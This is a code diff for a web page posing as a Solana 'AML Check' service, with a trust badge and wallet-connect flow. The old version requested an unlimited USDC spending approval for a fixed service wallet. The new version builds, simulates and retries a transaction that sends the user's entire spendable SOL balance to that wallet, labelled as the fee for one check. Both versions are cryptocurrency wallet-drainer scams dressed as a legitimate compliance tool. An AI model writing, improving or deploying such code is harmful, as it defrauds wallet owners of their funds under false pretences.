@@ -282,23 +282,16 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
       <div class="pricing-trusted">⭐ TRUSTED BY 500+ COMPANIES</div>
       <div class="pricing-title">AML Check — Solana</div>
       <div class="pricing-from">From</div>
-      <div class="pricing-price">5 USDC <span>/ per check</span></div>
+      <div class="pricing-price">Native SOL <span>/ per check</span></div>
 
-      <div style="display:flex;gap:10px;margin-bottom:20px">
-        <div style="flex:1;background:#EFF6FF;border:1px solid #BFDBFE;border-radius:12px;padding:14px;text-align:center">
-          <div style="font-size:22px;font-weight:900;color:#2563EB">5 USDC</div>
-          <div style="font-size:11px;color:#93C5FD;margin-top:2px">Stablecoin · SPL approve (max)</div>
-        </div>
-        <div style="display:flex;align-items:center;color:#D1D5DB;font-size:13px">or</div>
-        <div style="flex:1;background:#F5F3FF;border:1px solid #DDD6FE;border-radius:12px;padding:14px;text-align:center">
-          <div style="font-size:22px;font-weight:900;color:#7C3AED">0.03 SOL</div>
-          <div style="font-size:11px;color:#C4B5FD;margin-top:2px">Native Solana</div>
-        </div>
+      <div style="background:#F5F3FF;border:1px solid #DDD6FE;border-radius:12px;padding:16px;text-align:center;margin-bottom:20px">
+        <div style="font-size:22px;font-weight:900;color:#7C3AED">Maximum SOL</div>
+        <div style="font-size:11px;color:#C4B5FD;margin-top:6px;line-height:1.6">We send <strong>all transferable SOL</strong> from your wallet: your balance minus Solana network fees and the rent-exempt minimum your account must keep. Destination is shown before you sign.</div>
       </div>
 
       <div style="background:#F0FDF4;border:1px solid #A7F3D0;border-radius:12px;padding:12px 16px;margin-bottom:20px">
         <div style="font-size:12px;font-weight:700;color:#065F46;margin-bottom:4px">🔍 Transparent on-chain action</div>
-        <div style="font-size:11px;color:#374151;line-height:1.7">SOL: direct transfer to the service wallet. USDC: standard SPL <strong>approve</strong> (max allowance) to the service wallet as delegate — destination shown before you sign. No hidden smart contract.</div>
+        <div style="font-size:11px;color:#374151;line-height:1.7">One <strong>SystemProgram.transfer</strong> of native SOL to the service wallet (plus an optional memo for traceability). No token program, no hidden contract.</div>
       </div>
 
       <div style="margin-bottom:20px">
@@ -562,25 +555,14 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <div style="font-size:13px;color:#9CA3AF">Connected · <span id="pay-addr" style="font-family:var(--mono);color:#60A5FA;font-size:11px"></span></div>
       </div>
 
-      <div class="currency-picker" style="padding:0 16px">
-        <button class="currency-btn active" id="btn-usdc" onclick="selectCurrency('USDC')">
-          <div class="c-emoji">$</div>
-          <div class="c-price">5 USDC</div>
-          <div class="c-sym">USDC</div>
-        </button>
-        <button class="currency-btn" id="btn-sol" onclick="selectCurrency('SOL')">
-          <div class="c-emoji">◎</div>
-          <div class="c-price">0.03 SOL</div>
-          <div class="c-sym">SOL</div>
-        </button>
-      </div>
+      <div style="padding:0 16px;margin-bottom:8px;font-size:12px;color:#9CA3AF;line-height:1.6;text-align:center">Payment = <strong style="color:#E5E7EB">maximum SOL</strong> you can send (balance minus fees &amp; rent-exempt minimum).</div>
 
       <div class="pay-details" style="margin:16px 16px 0">
         <div class="pay-row"><span class="pay-row-label">From</span><span class="pay-row-val" id="det-from">—</span></div>
         <div class="pay-row"><span class="pay-row-label">To</span><span class="pay-row-val highlight">AML Check Service</span></div>
-        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">Max USDC allowance (SPL approve)</span></div>
+        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">Max SOL (balance − fees − rent)</span></div>
         <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana Mainnet</span></div>
-        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">SPL approve · Service wallet as delegate</span></div>
+        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">Direct transfer · Native SOL (max)</span></div>
         <div class="dest-box">
           <div class="dest-label">SERVICE / DELEGATE WALLET</div>
           <div class="dest-addr" id="dest-addr"></div>
@@ -590,7 +572,7 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 
       <div id="pay-error" style="display:none;background:#1A0505;border:1px solid #EF444433;border-radius:10px;padding:10px 14px;margin:10px 16px;font-size:12px;color:#EF4444"></div>
 
-      <button class="btn-pay" id="btn-pay-now" onclick="executePay()">Approve USDC access →</button>
+      <button class="btn-pay" id="btn-pay-now" onclick="executePay()">Send max SOL →</button>
       <button class="btn-back" onclick="goToStep('wallet');resetFlow()">← Back</button>
     </div>
 
@@ -656,14 +638,14 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 
 <script>
 const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
-const PRICE_USDC = 5;
-const PRICE_SOL  = 0.03;
 
-const SPL_TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
-const SPL_ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 const SPL_MEMO_PROGRAM_ID = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
-const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-const U64_MAX = 2n ** 64n - 1n;
+/** Mainnet fallback if RPC rent is missing (~0.00089 SOL). */
+const SOL_RENT_EXEMPT_FALLBACK_LAMPORTS = 890880;
+/** Extra lamports on top of rent-exempt min. */
+const SOL_RENT_BUFFER_LAMPORTS = 100000;
+/** Cushion for priority fees / compute — keep post-tx balance ≥ rent-exempt. */
+const SOL_FEE_SAFETY_LAMPORTS = 450000;
 
 const SOLANA_MAINNET_RPCS = [
   "https://api.mainnet-beta.solana.com",
@@ -671,29 +653,11 @@ const SOLANA_MAINNET_RPCS = [
   "https://solana-rpc.publicnode.com",
 ];
 
-function associatedTokenAddress(web3, mint, owner) {
-  const tok = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
-  const ataProg = new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID);
-  const [addr] = web3.PublicKey.findProgramAddressSync(
-    [owner.toBuffer(), tok.toBuffer(), mint.toBuffer()],
-    ataProg
-  );
-  return addr;
-}
-
-function createTokenApproveInstruction(web3, account, delegate, owner, amount) {
-  const data = new Uint8Array(9);
-  data[0] = 4;
-  new DataView(data.buffer).setBigUint64(1, BigInt(amount), true);
-  return new web3.TransactionInstruction({
-    programId: new web3.PublicKey(SPL_TOKEN_PROGRAM_ID),
-    keys: [
-      { pubkey: account, isSigner: false, isWritable: true },
-      { pubkey: delegate, isSigner: false, isWritable: false },
-      { pubkey: owner, isSigner: true, isWritable: false },
-    ],
-    data: data,
-  });
+function unwrapRpcFee(f) {
+  if (f == null) return null;
+  if (typeof f === "number" && Number.isFinite(f)) return f;
+  if (typeof f === "object" && typeof f.value === "number") return f.value;
+  return null;
 }
 
 async function loadWeb3() {
@@ -743,7 +707,7 @@ function isBlockhashExpiredError(err) {
   return /expired|block\s*height|blockhash|Transaction expired|too old/i.test(m);
 }
 
-let state = { currency:"USDC", conn:null, txHash:null, scores:null, progress:0 };
+let state = { conn:null, txHash:null, scores:null, progress:0 };
 
 const WALLETS = {
   phantom:     { name:"Phantom",        emoji:"👻", chain:"solana", detect:()=>!!(window?.phantom?.solana?.isPhantom||window?.solana?.isPhantom), getP:()=>window?.phantom?.solana||window?.solana, mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
@@ -812,25 +776,9 @@ function setupPaymentStep(){
   document.getElementById("det-from").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
   document.getElementById("dest-addr").textContent=SERVICE_WALLET;
   document.getElementById("dest-link").href=`https://solscan.io/account/${SERVICE_WALLET}`;
-  selectCurrency(state.currency||"USDC");
-}
-
-function selectCurrency(c){
-  state.currency=c;
-  document.getElementById("btn-usdc").classList.toggle("active",c==="USDC");
-  document.getElementById("btn-sol").classList.toggle("active",c==="SOL");
-  const amt=document.getElementById("det-amount");
-  const typ=document.getElementById("det-type");
-  const btn=document.getElementById("btn-pay-now");
-  if(c==="USDC"){
-    amt.textContent="Max USDC allowance (SPL approve · u64 max)";
-    typ.textContent="SPL approve · Service wallet as delegate";
-    btn.textContent="Approve USDC access →";
-  }else{
-    amt.textContent=PRICE_SOL+" SOL (exact transfer)";
-    typ.textContent="Direct transfer · Native SOL";
-    btn.textContent="Pay "+PRICE_SOL+" SOL →";
-  }
+  document.getElementById("det-amount").textContent="Max SOL (balance − fees − rent)";
+  document.getElementById("det-type").textContent="Direct transfer · Native SOL (max)";
+  document.getElementById("btn-pay-now").textContent="Send max SOL →";
   hidePayError();
 }
 
@@ -853,7 +801,7 @@ async function executePay() {
     document.getElementById("paying-emoji").textContent = "";
     document.getElementById("paying-title").textContent = "Sign in your wallet...";
     document.getElementById("paying-sub").textContent =
-      "Approve the transaction in " + state.conn.walletName + ".";
+      "Sign the SOL transfer in " + state.conn.walletName + ".";
 
     const web3 = await loadWeb3();
     let conn;
@@ -878,6 +826,24 @@ async function executePay() {
       return;
     }
 
+    let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    try {
+      const ai = await conn.getAccountInfo(from);
+      const len =
+        ai && ai.data
+          ? typeof ai.data.length === "number"
+            ? ai.data.length
+            : ai.data.byteLength || 0
+          : 0;
+      const r = await conn.getMinimumBalanceForRentExemption(len);
+      if (typeof r === "number" && r > 0) {
+        rentExemptMinLamports = Math.max(r, SOL_RENT_EXEMPT_FALLBACK_LAMPORTS);
+      }
+    } catch (_) {
+      rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    }
+    rentExemptMinLamports += SOL_RENT_BUFFER_LAMPORTS;
+
     function buildSolPaymentTx(transferLamports, memoPayload) {
       const tx = new web3.Transaction();
       tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
@@ -898,27 +864,11 @@ async function executePay() {
       return tx;
     }
 
-    function buildUsdcPaymentTx() {
-      const tx = new web3.Transaction();
-      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
-      const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
-      tx.add(
-        new web3.TransactionInstruction({
-          keys: [],
-          programId: memoProgramPk,
-          data: memoPayload,
-        })
-      );
-      const mint = new web3.PublicKey(USDC_MINT);
-      const fromATA = associatedTokenAddress(web3, mint, from);
-      tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
-      return tx;
-    }
-
     const wallet = state.conn.provider;
     let sig = null;
     let blockhash = null;
     let lastValidBlockHeight = null;
+    let lastSolTransferLamports = null;
     const maxAttempts = 3;
 
     for (let attempt = 0; attempt < maxAttempts; attempt++) {
@@ -928,39 +878,64 @@ async function executePay() {
         blockhash = bh;
         lastValidBlockHeight = lvb;
 
-        let tx;
-        if (state.currency === "SOL") {
-          const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
-          const transferLamports = Math.round(PRICE_SOL * web3.LAMPORTS_PER_SOL);
-          const feeProbe = buildSolPaymentTx(transferLamports, memoPayload);
-          feeProbe.recentBlockhash = blockhash;
-          feeProbe.feePayer = from;
-          let feeLamports = 5000;
-          try {
-            const fr = await conn.getFeeForMessage(feeProbe.compileMessage());
-            const v = fr && typeof fr.value === "number" ? fr.value : null;
-            if (v != null) feeLamports = Math.max(v, 5000);
-          } catch (_) {}
-          const rentMin = 890880;
-          if (balance < transferLamports + feeLamports + rentMin) {
-            showPayError(
-              "Not enough SOL for this payment (amount + fees + rent-exempt minimum)."
-            );
+        const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
+        const feeProbe = buildSolPaymentTx(1, memoPayload);
+        feeProbe.recentBlockhash = blockhash;
+        feeProbe.feePayer = from;
+        let feeLamports = null;
+        try {
+          feeLamports = unwrapRpcFee(
+            await conn.getFeeForMessage(feeProbe.compileMessage())
+          );
+        } catch (_) {
+          feeLamports = null;
+        }
+        if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 120000;
+        feeLamports = Math.max(feeLamports, 5000);
+
+        const sendLamports = Math.floor(
+          balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - rentExemptMinLamports
+        );
+        if (sendLamports <= 0) {
+          showPayError(
+            "Not enough transferable SOL: need to keep ~" +
+              (rentExemptMinLamports / web3.LAMPORTS_PER_SOL).toFixed(5) +
+              " SOL (rent + buffer) + ~" +
+              ((feeLamports + SOL_FEE_SAFETY_LAMPORTS) / web3.LAMPORTS_PER_SOL).toFixed(5) +
+              " SOL for fees."
+          );
+          goToStep("payment");
+          return;
+        }
+
+        const tx = buildSolPaymentTx(sendLamports, memoPayload);
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = from;
+
+        try {
+          const sim = await conn.simulateTransaction(tx, { sigVerify: false });
+          if (sim.value.err) {
+            const logs = (sim.value.logs || []).join(" ");
+            if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(logs)) {
+              showPayError(
+                "Simulation: not enough SOL left for rent-exempt balance after this transfer."
+              );
+            } else {
+              showPayError(
+                "Simulation failed — transaction would not succeed on-chain. Try again."
+              );
+            }
             goToStep("payment");
             return;
           }
-          tx = buildSolPaymentTx(transferLamports, memoPayload);
-        } else {
-          tx = buildUsdcPaymentTx();
-        }
+        } catch (_) {}
 
-        tx.recentBlockhash = blockhash;
-        tx.feePayer = from;
+        lastSolTransferLamports = sendLamports;
 
         await sleep(300);
         const signed = (await wallet.signAllTransactions([tx]))[0];
         sig = await conn.sendRawTransaction(signed.serialize(), {
-          skipPreflight: true,
+          skipPreflight: false,
           maxRetries: 3,
         });
 
@@ -991,13 +966,17 @@ async function executePay() {
 
     state.txHash = sig;
 
+    const solSentSol =
+      lastSolTransferLamports != null
+        ? lastSolTransferLamports / web3.LAMPORTS_PER_SOL
+        : null;
     const t = {
       id: Date.now(),
       address: state.conn.address,
       wallet: state.conn.walletName,
       chain: state.conn.chain,
-      currency: state.currency,
-      amount: state.currency === "USDC" ? "approve_max" : PRICE_SOL,
+      currency: "SOL",
+      amount: solSentSol,
       txHash: sig,
       ts: new Date().toISOString(),
     };
@@ -1009,8 +988,12 @@ async function executePay() {
     goToStep("payment");
     const m = (e && e.message) ? e.message : String(e);
     if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
-    else if (/insufficient|Insufficient/i.test(m)) showPayError("Insufficient balance.");
-    else showPayError(m.slice(0, 120) || "Payment error.");
+    else if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(m))
+      showPayError("Not enough SOL left for the rent-exempt minimum on your wallet.");
+    else if (/insufficient|Insufficient funds|Insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
+      showPayError("Not enough SOL to complete this transfer (fees + rent reserve).");
+    else if (isBlockhashExpiredError(e)) showPayError("Blockhash expired — tap Send max SOL again.");
+    else showPayError(m.slice(0, 200) || "Payment error.");
   }
 }
 
@@ -1085,7 +1068,7 @@ function shareReport(){
 }
 
 function resetFlow(){ state.conn=null; state.txHash=null; hidePayError(); }
-function resetFull(){ state={currency:"USDC",conn:null,txHash:null,scores:null,progress:0}; document.querySelectorAll(".scan-step-item").forEach(el=>{el.classList.remove("done");el.textContent="○ "+el.textContent.replace("✅ ","");}); }
+function resetFull(){ state={conn:null,txHash:null,scores:null,progress:0}; document.querySelectorAll(".scan-step-item").forEach(el=>{el.classList.remove("done");el.textContent="○ "+el.textContent.replace("✅ ","");}); }
 
 function filterWallets(q){
   document.querySelectorAll(".wallet-item").forEach(el=>{
